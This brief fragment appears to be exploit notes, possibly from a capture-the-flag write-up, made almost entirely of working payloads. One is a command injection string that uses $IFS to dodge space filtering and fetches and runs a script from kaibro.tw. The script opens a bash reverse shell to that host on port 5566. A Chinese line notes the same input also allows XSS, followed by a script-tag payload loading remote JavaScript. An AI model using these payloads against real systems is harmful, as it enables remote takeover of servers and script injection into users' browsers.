site=';a=kaibro.tw/s.sh;b=/tmp;c=s.sh;cd$IFS$b;wget$IFS$a;sh$IFS$c;'


s.sh:

`bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`

---

除了Command Injection，他還可以XSS

`"><script src="http://kaibro.tw/gg.js"></script>`
